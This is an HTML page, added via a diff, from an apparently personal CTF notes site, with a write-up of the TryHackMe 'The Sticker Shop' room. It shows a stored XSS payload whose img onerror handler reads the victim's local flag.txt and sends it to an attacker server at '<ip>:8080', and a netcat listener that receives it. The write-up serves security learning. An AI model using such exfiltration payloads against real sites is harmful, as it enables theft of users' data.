@@ -1,0 +1,273 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>The Sticker Shop</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+        <link rel="stylesheet" href="../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../pwn.html">~/</a></li><li class="chapter-item expanded affix "><li class="part-title">TryHackMe</li><li class="chapter-item expanded "><a href="../tryhackme/The-Sticker-Shop.html" class="active"><strong aria-hidden="true">1.</strong> The Sticker Shop</a></li><li class="chapter-item expanded affix "><li class="part-title">Hackerone CTF</li><li class="chapter-item expanded "><a href="../hacker101/get-started/index.html"><strong aria-hidden="true">2.</strong> Get Started</a></li><li class="chapter-item expanded "><a href="../hacker101/Micro-CMSv1/index.html"><strong aria-hidden="true">3.</strong> Micro CMSv1</a></li><li class="chapter-item expanded affix "><li class="part-title">RootMe</li><li class="chapter-item expanded "><a href="../rootme/APP_SYSTEM/index.html"><strong aria-hidden="true">4.</strong> APP System</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../rootme/APP_SYSTEM/ELF_x86_Stack_buffer_overflow_basic_1/index.html"><strong aria-hidden="true">4.1.</strong> ELF x86 Stack BOF basic 1</a></li></ol></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/index.html"><strong aria-hidden="true">5.</strong> WEB CLIENT</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/HTML_disabled_buttons/index.html"><strong aria-hidden="true">5.1.</strong> HTML - disabled buttons</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/JS_Authentication/index.html"><strong aria-hidden="true">5.2.</strong> JS Authentication</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Javascript_Authentication/index.html"><strong aria-hidden="true">5.3.</strong> Javascript - Authentication</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Javascript_Native_code/index.html"><strong aria-hidden="true">5.4.</strong> Javascript - Native code</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Obfuscation_JS/index.html"><strong aria-hidden="true">5.5.</strong> Obfuscation JS</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Javascript_Obfuscation_2/index.html"><strong aria-hidden="true">5.6.</strong> Javascript - Obfuscation 2</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Javascript_Source/index.html"><strong aria-hidden="true">5.7.</strong> Javascript - Source</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Javascript-Obfuscation-3/index.html"><strong aria-hidden="true">5.8.</strong> Javascript - Obfuscation 3</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_CLIENT/Javascript-Webpack/index.html"><strong aria-hidden="true">5.9.</strong> Javascript Webpack</a></li></ol></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/index.html"><strong aria-hidden="true">6.</strong> WEB SERVER</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../rootme/WEB_Server/JWT-Introduction/index.html"><strong aria-hidden="true">6.1.</strong> JWT Introduction</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/HTTP-Openredirect.html"><strong aria-hidden="true">6.2.</strong> HTTP - Open redirect</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/JWT-Weak-secret.html"><strong aria-hidden="true">6.3.</strong> JWT - Weak secret</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/HTTP-User-agent.html"><strong aria-hidden="true">6.4.</strong> HTTP - User-agent</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/HTTP-POST.html"><strong aria-hidden="true">6.5.</strong> HTTP - Cookies</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/HTTP-Directory-indexing.html"><strong aria-hidden="true">6.6.</strong> HTTP Directory Indexing</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/HTTP-improper-redirect.html"><strong aria-hidden="true">6.7.</strong> HTTP Improper Redirection</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/php-command-injection.html"><strong aria-hidden="true">6.8.</strong> PHP Command Injection</a></li><li class="chapter-item expanded "><a href="../rootme/WEB_Server/HTTP-POST.html"><strong aria-hidden="true">6.9.</strong> HTTP - POST</a></li></ol></li><li class="chapter-item expanded "><a href="../rootme/Network/index.html"><strong aria-hidden="true">7.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../rootme/Network/FTP_authentication.html"><strong aria-hidden="true">7.1.</strong> FTP - authentication</a></li></ol></li><li class="chapter-item expanded "><a href="../rootme/APP_Script/index.html"><strong aria-hidden="true">8.</strong> APP SCRIPT</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../rootme/APP_Script/bash-system1.html"><strong aria-hidden="true">8.1.</strong> Bash - System 1</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <img width="100" align="center" alt="thm" src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377390091" />
+<h1 id="the-sticker-shop"><a class="header" href="#the-sticker-shop">The Sticker Shop</a></h1>
+<p><strong>Can you exploit the sticker shop in order to capture the flag?</strong></p>
+<p>Starting task, as we are going to face with a server run by a Local Sticker Shop hosted. I started the machine and jump over it.</p>
+<img alt="starting the machine" src="https://github.com/user-attachments/assets/15653f9d-7c60-470b-b242-cd5c12b856a9" />
+<img width="1000" align="catppuccin line" src="https://github-production-user-asset-6210df.s3.amazonaws.com/109761382/399944576-8a04c1c1-9f58-4f23-9548-4c71971b3576.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20260109%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20260109T140147Z&X-Amz-Expires=300&X-Amz-Signature=2be548619a8625a1b197b2e29de99408a8bbcf92c682e5bcf78b16cc0cdd6762&X-Amz-SignedHeaders=host" />
+<p>The first step I took is to visit the website and looked for the source and found <code>/submit_feedback</code> dir, which catched me.</p>
+<div class="table-wrapper"><table><thead><tr><th><img widht="900" src="https://github.com/user-attachments/assets/4a67214b-a540-4705-a765-53b4eff79e2e" /></th><th><img width="900" src="https://github.com/user-attachments/assets/6741784c-c161-4b4d-a135-e871ae2f9742" /></th></tr></thead><tbody>
+</tbody></table>
+</div>
+<p>And I visited to <strong><code>/submit_feedback</code></strong> and found a submition functionality available.</p>
+<img width="1000" alt="Screenshot from 2025-01-03 07-33-51" src="https://github.com/user-attachments/assets/0f94ce61-f51c-4e6c-afdd-99ee943ce345" />
+<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
+<p>As soon I saw this, I just started to try random XSS payloads, from <a href="https://github.com/payloadbox/xss-payload-list">payloadbox/xss-payload-list</a>, and cam to this payload..</p>
+<pre><code class="language-js">&lt;img src=x onerror="fetch('&lt;ip&gt;:8080')"/&gt;
+</code></pre>
+<blockquote>
+<p>[!NOTE]
+In the above payload an image would be loaded as img tag refers to <strong>X</strong> location, since the src fail to load and it simply goes to execute following and we just can grap the http request using <code>nc</code></p>
+<pre><code class="language-js">fetch('http://&lt;ip&gt;:8080');
+</code></pre>
+</blockquote>
+<p>And I just <code>nc</code> the headers before the submition of the payload, and yeah like this !!!</p>
+<pre><code class="language-bash">nc -knvlp 8080
+</code></pre>
+<div class="table-wrapper"><table><thead><tr><th><img src="https://github.com/user-attachments/assets/dd775ed6-f065-4a75-b271-1ee69639c288" alt="Screenshot from 2025-01-03 08-10-35" /></th><th><img src="https://github.com/user-attachments/assets/ba98eb99-9e6f-452a-8058-fcee51bed3e4" alt="Screenshot from 2025-01-03 08-08-40" /></th></tr></thead><tbody>
+<tr><td><img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" /></td><td></td></tr>
+<tr><td>Now to grab the flag I have used the following payload..</td><td></td></tr>
+</tbody></table>
+</div>
+<pre><code class="language-js">&lt;img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r =&gt; r.text()).then(r =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + r)).catch(e =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + e))"/&gt;
+</code></pre>
+<blockquote>
+<p>[!NOTE]
+Componenets..</p>
+</blockquote>
+<ul>
+<li><code>&lt;img src="x" onerror="..."&gt;</code>  - The image <code>src</code> is invalid, causing the <code>onerror</code> attribute to execute when the browser fails to load the image.</li>
+<li><code>fetch('http://127.0.0.1:8080/flag.txt')</code> - This initiates an HTTP GET request to the victim's localhost at port 8080, targeting the <code>flag.txt</code> file.</li>
+<li><code>.then(r =&gt; r.text())</code> - If the request succeeds, this processes the response (<code>r</code>) and converts it into text using the <code>.text()</code> method.</li>
+<li><code>.then(r =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + r))</code> - After retrieving the file content, another <code>fetch</code> request sends the content (<code>r</code>) to the attacker's server (<code>http://&lt;ip&gt;:8080</code>) as part of the query string (<code>?c=...</code>).</li>
+<li><code>.catch(e =&gt; fetch('http://&lt;ip&gt;:8080/?c=' + e))</code> - If the initial <code>fetch</code> fails (e.g., the file doesn't exist or CORS blocks the request), the <code>catch</code> block handles the error and sends the error message (<code>e</code>) to the attacker's server.
+<img width="1000" align="catppuccin line" src="https://github.com/user-attachments/assets/8a04c1c1-9f58-4f23-9548-4c71971b3576" />
+<img width="1000"  alt="flag png" src="https://github.com/user-attachments/assets/6d86b886-7eed-492d-86c9-05cb9a1b6d09" /></li>
+</ul>
+<p><em><strong>Yes! Thank you for reading till here ;)</strong></em></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../pwn.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../hacker101/get-started/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../pwn.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../hacker101/get-started/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
